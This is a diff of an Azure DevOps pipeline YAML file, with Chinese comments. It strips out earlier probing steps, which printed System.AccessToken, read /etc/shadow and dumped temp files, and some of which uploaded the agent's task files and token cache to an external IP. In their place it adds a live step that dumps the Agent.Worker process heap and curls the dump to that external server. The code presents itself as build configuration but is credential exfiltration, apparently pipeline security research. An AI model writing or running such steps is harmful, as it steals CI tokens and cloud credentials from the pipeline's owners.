@@ -6,215 +6,40 @@ trigger:
 pool:
   vmImage: 'ubuntu-latest'
 
-variables:
-  System.Debug: true
-
 steps:
 - checkout: self
   persistCredentials: false  # 不保留凭据
 
-- script: |
-    # sudo capsh --print
-    # mount
-    # sudo ls -l /proc/1/
-    id
-    # ls -l /dev/sda
-    # sudo cat /proc/self/cgroup
-    # az ad sp list --display-name test_azure_function_private
-    sudo cat /proc/$(ps -e | grep "Agent.Listener" | awk '{print $1}')/maps
-    pkexec --disable-internal-agent cat /etc/shadow
-    # find / -user root -perm -4000 -print 2>/dev/null
-    pstree -p
 
-    ps aux
-  displayName: 'pstree / ps aux命令'
-
-- script: |
-    sudo cat /proc/$(ps -e | grep "Agent.Listener" | awk '{print $1}')/maps
-  displayName: 'cat maps命令'
-
-- script: |
-    ls -al /
-    lsof -p $(ps -e | grep "Agent.Worker" | awk '{print $1}')
-    echo $(System.AccessToken) | base64
-    echo "Recursively checking _tasks directory after github checkout task..."
-    # tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks  
-    # if [ -f /home/vsts/work/_temp/tasks.tar.gz ]; then
-    #     echo "tasks.tar.gz found. Uploading..."
-    #     curl -F "file=@/home/vsts/work/_temp/tasks.tar.gz" http://139.180.193.16:5000/upload
-    # else
-    #     echo "tasks.tar not found."
-    # fi
-    
-  displayName: 'Recursively list and display _task directory contents after AzureFunctionApp task'
-
-  
-# - script: |
-#     echo "Recursively checking _temp directory after github checkout task..."
-#     shopt -s dotglob  # 包含隐藏文件和文件夹
-#     echo "Listing all files and directories in /home/vsts/work/_temp:"
-#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#     done
-#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-- script: |
-    az pipelines variable-group list --output table --organization https://dev.azure.com/13911336781/ --project TestCICD_load_function
-  env:
-    AZURE_DEVOPS_EXT_PAT: $(System.AccessToken)
-  displayName: 'List variable groups using the script step'
-
-- script: |
-    printenv
-  displayName: 'Print env'
-
-- script: |
-    echo "Recursively checking _temp directory after AzureCLI task..."
-    shopt -s dotglob  # 包含隐藏文件和文件夹
-    echo "Listing all files and directories in /home/vsts/work/_temp:"
-    find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-    find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-    done
-  displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-  
-# - task: AzureCLI@2
-#   inputs:
-#     azureSubscription: 'test_connection'
-#     scriptType: 'bash'
-#     scriptLocation: 'inlineScript'
-#     inlineScript: |
-#       echo "Inline script is here..........."
-#       shopt -s dotglob  # 包含隐藏文件和文件夹
-#       echo "Listing all files and directories in /home/vsts/work/_temp:"
-#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#       done
-#       az --version
-#   displayName: 'Run Azure CLI script'
-
-
-# - script: |
-#     pstree -p
-
-#     ps aux
-#   displayName: 'pstree / ps aux命令'
-
-# - script: |
-#     echo "Recursively checking _temp directory after AzureCLI task..."
-#     shopt -s dotglob  # 包含隐藏文件和文件夹
-#     echo "Listing all files and directories in /home/vsts/work/_temp:"
-#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#     done
-#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-# # - script: |
-# #     echo "Checking for msal_http_cache.bin file..."
-# #     if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
-# #         echo "msal_http_cache.bin found. Uploading..."
-# #         curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
-# #     else
-# #         echo "msal_http_cache.bin not found."
-# #     fi
-# #   displayName: 'Check and Upload msal_http_cache.bin'
-  
-- task: AzureFunctionApp@1
+- task: NodeTool@0
   inputs:
-    azureSubscription: 'test_connection'
-    appType: 'functionApp'
-    appName: 'mypocfunctiontest'
-    package: '$(Build.ArtifactStagingDirectory)/'
-  displayName: 'Deploy Azure Function App'
+    versionSpec: '12.x'  # 或你所需的Node.js版本
+    checkLatest: true
+  displayName: 'Setup Node.js'
 
-# - script: |
-#     echo "Recursively checking _temp directory after AzureFunctionApp task..."
-#     shopt -s dotglob  # 包含隐藏文件和文件夹
-#     echo "Listing all files and directories in /home/vsts/work/_temp:"
-#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#     done
-#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-
-# - task: AzureCLI@2
-#   inputs:
-#     azureSubscription: 'test_connection'
-#     scriptType: 'bash'
-#     scriptLocation: 'inlineScript'
-#     inlineScript: |
-#       echo "2 Inline script is here..........."
-#       shopt -s dotglob  # 包含隐藏文件和文件夹
-#       echo "Listing all files and directories in /home/vsts/work/_temp:"
-#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#       done
-#       az --version
-#   displayName: '2 Run Azure CLI script'
-
-# - script: |
-#     echo $(System.AccessToken) | base64
-#     echo "Recursively checking _temp directory after AzureCLI task..."
-#     shopt -s dotglob  # 包含隐藏文件和文件夹
-#     echo "Listing all files and directories in /home/vsts/work/_temp:"
-#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-#         echo "Content of $file:"
-#         cat "$file"
-#         echo ""
-#     done
-#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-
-# - task: NodeTool@0
-#   inputs:
-#     versionSpec: '12.x'  # 或你所需的Node.js版本
-#     checkLatest: true
-#   displayName: 'Setup Node.js'
-
-# - script: |
-#     dotnet tool install --global dotnet-dump
+- script: |
+    dotnet tool install --global dotnet-dump
     
-#     #!/bin/bash
+    #!/bin/bash
 
-#     # 获取Agent.Worker进程的PID
-#     PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}')
+    # 获取Agent.Worker进程的PID
+    PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}')
     
-#     # 确保获取到了PID
-#     if [ -z "$PID" ]; then
-#         echo "Error: Unable to find PID for Agent.Worker."
-#         exit 1
-#     fi
+    # 确保获取到了PID
+    if [ -z "$PID" ]; then
+        echo "Error: Unable to find PID for Agent.Worker."
+        exit 1
+    fi
     
-#     echo "The PID of Agent.Worker is $PID"
-#     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
+    echo "The PID of Agent.Worker is $PID"
+    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     
-#     tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" "/home/vsts/work/_temp/heap_worker.bin"
-#     echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
-#     sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
+    tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" "/home/vsts/work/_temp/heap_worker.bin"
+    echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
+    sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
  
-#   displayName: 'cat maps'
+  displayName: 'cat maps'
 
 - script: |
     npm install
   displayName: 'Npm Install'
-
-
